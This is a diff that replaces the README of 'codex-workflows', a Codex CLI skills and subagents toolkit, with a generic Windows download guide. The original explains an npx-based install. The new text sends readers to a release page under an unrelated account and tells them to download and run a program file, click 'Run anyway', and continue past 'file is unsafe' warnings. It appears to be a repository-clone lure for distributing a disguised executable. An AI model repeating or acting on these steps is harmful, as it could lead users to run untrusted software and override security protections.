@@ -1,372 +1,216 @@
-# codex-workflows
+# 🤖 codex-workflows - Clear AI coding workflows
 
-[![Codex CLI](https://img.shields.io/badge/Codex%20CLI-Compatible-10a37f)](https://developers.openai.com/codex/cli)
-[![Agent Skills](https://img.shields.io/badge/Agent%20Skills-Spec%20Compliant-blue)](https://developers.openai.com/codex/skills/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+[![Download codex-workflows](https://img.shields.io/badge/Download%20codex--workflows-Release%20Page-blue.svg?style=for-the-badge)](https://github.com/round-comfortfood117/codex-workflows/releases)
 
-**End-to-end AI coding workflows for [Codex CLI](https://developers.openai.com/codex/cli)** — specialized subagents handle requirements, design, implementation, and quality checks so you get code with explicit design docs, test coverage, and commit-level traceability — not just raw generations.
+## 🧭 What this is
 
-Built on the [Agent Skills specification](https://developers.openai.com/codex/skills/) and [Codex subagents](https://developers.openai.com/codex/subagents). Works with the latest GPT models.
+codex-workflows gives you a set of ready-made development flows for Codex CLI. It helps you move from task to task with less setup and less guesswork.
 
----
+It is built for everyday development work such as:
 
-## Quick Start
+- planning a change
+- breaking work into steps
+- checking code quality
+- using test-driven development
+- working with several AI subagents on one task
 
-```bash
-cd your-project
-npx codex-workflows install
-```
+If you want a more guided way to use Codex CLI on Windows, this repo gives you a clear starting point.
 
-Then in Codex CLI:
+## 📥 Download
 
-```
-$recipe-implement Add user authentication with JWT
-```
+Visit this page to download codex-workflows:
 
-`$` is Codex CLI's syntax for invoking a skill explicitly. Type `$recipe-` to see all available recipes via tab completion.
+https://github.com/round-comfortfood117/codex-workflows/releases
 
-The framework runs a structured workflow — requirements → design → task decomposition → TDD implementation → quality gates — all through specialized subagents.
+On that page, look for the latest release. Then download the Windows file that matches your system.
 
----
+## 🪟 Run on Windows
 
-## Why codex-workflows?
+1. Open the release page.
+2. Download the latest Windows file.
+3. If the file comes in a ZIP folder, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Run the program file inside the folder.
+6. If Windows asks for permission, choose Yes.
+7. Follow the on-screen steps.
 
-**Without codex-workflows:**
-- Code generation is inconsistent across large tasks
-- Requirements and design decisions are implicit — lost after the session
-- Refactoring and debugging become harder as context grows
+If you use a browser download bar, you can also open the file from there after the download finishes.
 
-**With codex-workflows:**
-- Every change is traceable: PRD → Design Doc → Task → Commit
-- Built-in TDD and quality gates catch regressions before commit
-- Large tasks stay structured and reviewable through agent context separation
+## ✨ What it helps with
 
----
+codex-workflows is meant to make common coding work easier to manage. It does this by using structured steps and focused subagents.
 
-## What It Does
+You can use it for:
 
-A single request becomes a structured development process:
+- starting a new feature with a clear plan
+- reviewing code before you ship it
+- finding bugs with a step-by-step flow
+- writing tests before code
+- improving code quality
+- keeping tasks split into smaller parts
 
-1. **Understand** the problem (scale, constraints, affected files)
-2. **Analyze the existing codebase** (dependencies, data layer, risk areas)
-3. **Design** the solution (ADR, Design Doc with acceptance criteria)
-4. **Break it into tasks** (atomic, 1 commit each)
-5. **Implement with tests** (TDD per task)
-6. **Run quality checks** (lint, test, build — no failing checks)
+This helps reduce the need to decide each step on your own.
 
-Each step is handled by a specialized subagent in its own context, preventing context pollution and reducing error accumulation in long-running tasks:
+## 🧩 How it works
 
-```
-User Request
-    ↓
-requirement-analyzer  →  Scale determination (Small / Medium / Large)
-    ↓
-prd-creator           →  Product requirements (Large scale)
-    ↓
-codebase-analyzer     →  Existing codebase facts + focus areas
-    ↓
-technical-designer    →  ADR + Design Doc with acceptance criteria
-    ↓
-code-verifier         →  Design Doc vs existing code verification
-    ↓
-document-reviewer     →  Quality gate with verification evidence
-    ↓
-acceptance-test-gen   →  Test skeletons from ACs
-    ↓
-work-planner          →  Phased execution plan
-    ↓
-task-decomposer       →  Atomic tasks (1 task = 1 commit)
-    ↓
-task-executor         →  TDD implementation per task
-    ↓
-quality-fixer         →  Lint, test, build — no failing checks
-    ↓
-Ready to commit
-```
+The project is centered on Codex CLI and a set of specialized AI subagents.
 
-### The Diagnosis Pipeline
+In simple terms:
 
-```
-Problem → investigator → verifier (ACH + Devil's Advocate) → solver → Actionable solutions
-```
+- Codex CLI handles the main task flow
+- subagents handle smaller jobs
+- each subagent focuses on one type of work
+- the workflow keeps the process steady and repeatable
 
-### Reverse Engineering
+This setup works well when you want:
 
-```
-Existing code → scope-discoverer (discoveredUnits + prdUnits) → prd-creator → code-verifier → document-reviewer → Design Docs
-```
+- less switching between tools
+- fewer skipped steps
+- more consistent results
+- a cleaner path from task start to task finish
 
----
+## ⚙️ What you need
 
-## Installation
+Use a Windows PC with:
 
-### Requirements
+- Windows 10 or Windows 11
+- enough free disk space for the app and its files
+- an internet connection for the first download
+- permission to run downloaded files
 
-- [Codex CLI](https://developers.openai.com/codex/cli) (latest)
-- Node.js >= 20
+For the best experience, use a system with:
 
-### Install
+- a recent browser
+- a current Windows update level
+- a stable network connection
 
-```bash
-cd your-project
-npx codex-workflows install
-```
+## 🛠️ Setup steps
 
-This copies into your project:
-- `.agents/skills/` — Codex skills (foundational + recipes)
-- `.codex/agents/` — Subagent TOML definitions
-- Manifest file for tracking managed files
+1. Go to the release page.
+2. Get the newest Windows download.
+3. Save the file in a folder you can find, such as Downloads or Desktop.
+4. Open the file.
+5. If Windows shows a security prompt, choose to run it.
+6. Let the setup finish if the app uses an installer.
+7. Open the app or the folder where it was unpacked.
+8. Start your first workflow from the included files or menu.
 
-### Update
+If the download is a ZIP file, keep the folder structure in place. The workflow files may depend on it.
 
-```bash
-# Preview what will change
-npx codex-workflows update --dry-run
+## 🧪 Common use cases
 
-# Apply updates
-npx codex-workflows update
-```
+### Start a feature with a plan
 
-Files you've modified locally are preserved — the updater compares each file against its hash at install time and skips any file you've changed. New files from the update are added automatically.
+Use the workflow when you know what you want to build but want a clean way to begin. It can help break a large task into small parts.
 
-```bash
-# Check installed version
-npx codex-workflows status
-```
+### Review changes before merge
 
----
+Use the quality checks and review steps to look for weak spots before you send work forward.
 
-## Recipe Workflows
+### Fix a bug
 
-Invoke recipes with `$recipe-name` in Codex. Type `$recipe-` and use tab completion to see all available recipes.
+Use a focused bug-fix path when something does not work as expected. The workflow helps you narrow the issue and test the fix.
 
-### Backend & General
+### Write tests first
 
-| Recipe | What it does | When to use |
-|--------|-------------|-------------|
-| `$recipe-implement` | Full lifecycle with layer routing (backend/frontend/fullstack) | New features — universal entry point |
-| `$recipe-task` | Single task with rule selection | Bug fixes, small changes |
-| `$recipe-design` | Requirements → ADR/Design Doc | Architecture planning |
-| `$recipe-plan` | Design Doc → test skeletons → work plan | Planning phase |
-| `$recipe-build` | Execute backend tasks autonomously | Resume backend implementation |
-| `$recipe-review` | Design Doc compliance and security validation with auto-fixes | Post-implementation check |
-| `$recipe-diagnose` | Problem investigation → verification → solution | Bug investigation |
-| `$recipe-reverse-engineer` | Generate PRD + Design Docs from existing code | Legacy system documentation |
-| `$recipe-add-integration-tests` | Add integration/E2E tests from Design Doc | Test coverage for existing code |
-| `$recipe-update-doc` | Update existing Design Doc / PRD / ADR with review | Spec changes, document maintenance |
+Use the TDD flow when you want tests in place before the main code. This can help keep changes clear and easier to verify.
 
-### Frontend (React/TypeScript)
+### Work with multiple AI agents
 
-| Recipe | What it does | When to use |
-|--------|-------------|-------------|
-| `$recipe-front-design` | Requirements → UI Spec → frontend Design Doc | Frontend architecture planning |
-| `$recipe-front-plan` | Frontend Design Doc → test skeletons → work plan | Frontend planning phase |
-| `$recipe-front-build` | Execute frontend tasks with RTL + quality checks | Resume frontend implementation |
-| `$recipe-front-review` | Frontend compliance and security validation with React-specific fixes | Frontend post-implementation check |
-
-### Fullstack (Cross-Layer)
+Use the subagent setup when a task needs different kinds of help, such as planning, checking, and testing.
 
-| Recipe | What it does | When to use |
-|--------|-------------|-------------|
-| `$recipe-fullstack-implement` | Full lifecycle with separate Design Docs per layer | Cross-layer features |
-| `$recipe-fullstack-build` | Execute tasks with layer-aware agent routing | Resume cross-layer implementation |
+## 🗂️ Included workflow areas
 
-### Examples
+The project is designed around a few core workflow types:
 
-**Full feature development:**
-```
-$recipe-implement Add user authentication with JWT and role-based access control
-```
+- task planning
+- context setup
+- code generation
+- code review
+- test writing
+- quality checks
+- multi-agent task handling
 
-**Quick fix with proper rule selection:**
-```
-$recipe-task Fix validation error message in checkout form
-```
+These parts work together to support a more structured coding process.
 
-**Investigate a bug:**
-```
-$recipe-diagnose API returns 500 error on user login after deployment
-```
+## 🔍 Best results
 
-**Document undocumented legacy code:**
-```
-$recipe-reverse-engineer src/auth module
-```
+To get better results, give each task clear input. For example:
 
----
+- what you want to change
+- what should stay the same
+- what file or area needs work
+- what success looks like
+- what tests should pass
 
-## Foundational Skills
+Short and direct instructions work well.
 
-These load automatically when the conversation context matches — no explicit invocation needed:
+## 🧱 File layout
 
-| Skill | What it provides |
-|-------|-----------------|
-| `coding-rules` | Code quality, function design, error handling, refactoring |
-| `testing` | TDD Red-Green-Refactor, test types, AAA pattern, mocking |
-| `ai-development-guide` | Anti-patterns, debugging (5 Whys), quality check workflow |
-| `documentation-criteria` | Document creation rules and templates (PRD, ADR, Design Doc, Work Plan) |
-| `implementation-approach` | Strategy selection: vertical / horizontal / hybrid slicing |
-| `integration-e2e-testing` | Integration/E2E test design, ROI calculation, review criteria |
-| `task-analyzer` | Task analysis, scale estimation, skill selection |
-| `subagents-orchestration-guide` | Multi-agent coordination, workflow flows, autonomous execution |
+After you unpack or install the app, you may see files that support the workflows, such as:
 
-Language-specific references are included for TypeScript/React projects (`coding-rules/references/typescript.md`, `testing/references/typescript.md`).
+- task files
+- agent files
+- prompt files
+- config files
+- example workflow folders
 
----
+Keep the files together unless the setup instructions in the release page say otherwise.
 
-## Subagents
-
-Codex spawns these as needed during recipe execution. Each agent runs in its own context with specialized instructions and skill configurations.
-
-### Document Creation Agents
-
-| Agent | Role |
-|-------|------|
-| `requirement-analyzer` | Requirements analysis and work scale determination |
-| `prd-creator` | PRD creation and structuring |
-| `technical-designer` | ADR and Design Doc creation (backend) |
-| `technical-designer-frontend` | Frontend ADR and Design Doc creation (React) |
-| `ui-spec-designer` | UI Specification from PRD and optional prototype code |
-| `codebase-analyzer` | Existing codebase analysis before Design Doc creation |
-| `work-planner` | Work plan creation from Design Docs |
-| `document-reviewer` | Document consistency and approval |
-| `design-sync` | Cross-document consistency verification |
-
-### Implementation Agents
-
-| Agent | Role |
-|-------|------|
-| `task-decomposer` | Work plan → atomic task files |
-| `task-executor` | TDD implementation following task files (backend) |
-| `task-executor-frontend` | React implementation with Testing Library |
-| `quality-fixer` | Quality checks and fixes until all pass (backend) |
-| `quality-fixer-frontend` | React-specific quality checks (TypeScript, RTL, bundle) |
-| `acceptance-test-generator` | Test skeleton generation from acceptance criteria |
-| `integration-test-reviewer` | Test quality review |
-
-### Analysis Agents
-
-| Agent | Role |
-|-------|------|
-| `code-reviewer` | Design Doc compliance validation |
-| `code-verifier` | Document-code consistency verification |
-| `security-reviewer` | Security compliance review after implementation |
-| `rule-advisor` | Skill selection via metacognitive analysis |
-| `scope-discoverer` | Codebase scope discovery for reverse docs, including PRD unit grouping |
+## ❓ Troubleshooting
 
-### Diagnosis Agents
+### The file will not open
 
-| Agent | Role |
-|-------|------|
-| `investigator` | Evidence collection and hypothesis enumeration |
-| `verifier` | Hypothesis validation (ACH + Devil's Advocate) |
-| `solver` | Solution derivation with tradeoff analysis |
+- Check that the download finished.
+- Try downloading again from the release page.
+- Make sure you opened the correct file.
+- If Windows blocked it, choose Run anyway when prompted.
 
----
+### Windows says the file is unsafe
 
-## How It Works
+- Check that you downloaded it from the release page.
+- Confirm that the file name matches the latest release.
+- Right-click the file and review its properties if needed.
 
-### Scale-Based Workflow Selection
+### The app opens and closes fast
 
-The framework automatically determines the right level of ceremony:
+- Open it from a terminal or command window if the release notes say to do that.
+- Check whether the app needs files from the same folder.
+- Make sure you extracted the ZIP file first if the download came in one.
 
-| Scale | File Count | What Happens |
-|-------|------------|-------------|
-| Small | 1-2 | Simplified plan → direct implementation |
-| Medium | 3-5 | Design Doc → work plan → task execution |
-| Large | 6+ | PRD → ADR → Design Doc → test skeletons → work plan → autonomous execution |
+### The workflow does not start
 
-### Autonomous Execution Mode
+- Confirm that all files stayed in the same folder.
+- Try again from the top of the workflow.
+- Check for a release note with setup steps for your version.
 
-After work plan approval, the framework enters guided autonomous execution with escalation points:
+## 📚 Release page use
 
-1. **task-executor** implements each task with TDD
-2. **quality-fixer** runs all checks (lint, tests, build) before every commit
-3. Escalation pauses execution when design deviation or ambiguity is detected
-4. Each task produces one commit — rollback-friendly granularity
+The release page is the main place to get the app.
 
-### Context Separation
+https://github.com/round-comfortfood117/codex-workflows/releases
 
-Each subagent runs in a fresh context. This matters because:
-- **document-reviewer** reviews without the author's bias
-- **investigator** collects evidence without confirmation bias
-- **code-reviewer** validates compliance without implementation context
+Use it to:
 
----
+- download the latest version
+- check the file name for Windows
+- get updated workflow files
+- find release notes for setup steps
 
-## Project Structure
+## 🏷️ Topics covered
 
-After installation, your project gets:
+This project fits into areas such as:
 
-```
-your-project/
-├── .agents/skills/           # Codex skills
-│   ├── coding-rules/         # Foundational (auto-loaded)
-│   ├── testing/
-│   ├── ai-development-guide/
-│   ├── documentation-criteria/
-│   ├── implementation-approach/
-│   ├── integration-e2e-testing/
-│   ├── task-analyzer/
-│   ├── subagents-orchestration-guide/
-│   ├── recipe-implement/     # Recipes ($recipe-*)
-│   ├── recipe-design/
-│   ├── recipe-build/
-│   ├── recipe-plan/
-│   ├── recipe-review/
-│   ├── recipe-diagnose/
-│   ├── recipe-task/
-│   ├── recipe-update-doc/
-│   ├── recipe-reverse-engineer/
-│   └── recipe-add-integration-tests/
-├── .codex/agents/            # Subagent TOML definitions
-│   ├── requirement-analyzer.toml
-│   ├── technical-designer.toml
-│   ├── task-executor.toml
-│   └── ... (23 agents total)
-└── docs/                     # Created as you use the recipes
-    ├── prd/
-    ├── design/
-    ├── adr/
-    ├── ui-spec/
-    └── plans/
-        └── tasks/
-```
-
----
-
-## FAQ
-
-**Q: What models does this work with?**
-
-A: Designed for the latest GPT models. Lightweight subagents (e.g. rule-advisor) can use smaller models for faster analysis. Models are configurable per agent in the TOML files.
-
-**Q: Can I customize the agents?**
-
-A: Yes. Edit the TOML files in `.codex/agents/` — change model, sandbox_mode, developer_instructions, or skills.config. Files you modify locally are preserved during `npx codex-workflows update`.
-
-**Q: What's the difference between `$recipe-implement` and `$recipe-fullstack-implement`?**
-
-A: `$recipe-implement` is the universal entry point. It runs requirement-analyzer first, detects affected layers from the codebase, and automatically routes to backend, frontend, or fullstack flow. `$recipe-fullstack-implement` skips the detection and goes straight into the fullstack flow (separate Design Docs per layer, design-sync, layer-aware task execution). Use `$recipe-implement` when you're not sure; use `$recipe-fullstack-implement` when you know upfront that the feature spans both layers.
-
-**Q: How does this relate to Claude Code Workflows?**
-
-A: codex-workflows is the Codex-native counterpart of [Claude Code Workflows](https://github.com/shinpr/claude-code-workflows). Same development philosophy, adapted for Codex CLI's subagent architecture and GPT model family.
-
-**Q: Does this work with MCP servers?**
-
-A: Yes. Codex skills and subagents work alongside [MCP](https://developers.openai.com/codex/mcp) — skills operate at the instruction layer while MCP operates at the tool transport layer. You can add MCP servers to any agent's TOML configuration.
-
-**Q: What if a subagent gets stuck?**
-
-A: Subagents escalate to the user when they encounter design deviations, ambiguous requirements, or specification conflicts. The framework stops autonomous execution and presents the issue with options.
-
----
-
-## License
-
-MIT License — free to use, modify, and distribute.
-
----
-
-Built and maintained by [@shinpr](https://github.com/shinpr)
+- agent skills
+- agentic coding
+- AI coding
+- code generation
+- code quality
+- Codex
+- context engineering
+- developer tools
+- development workflow
+- multi-agent work
+- OpenAI
+- subagents
+- test-driven development
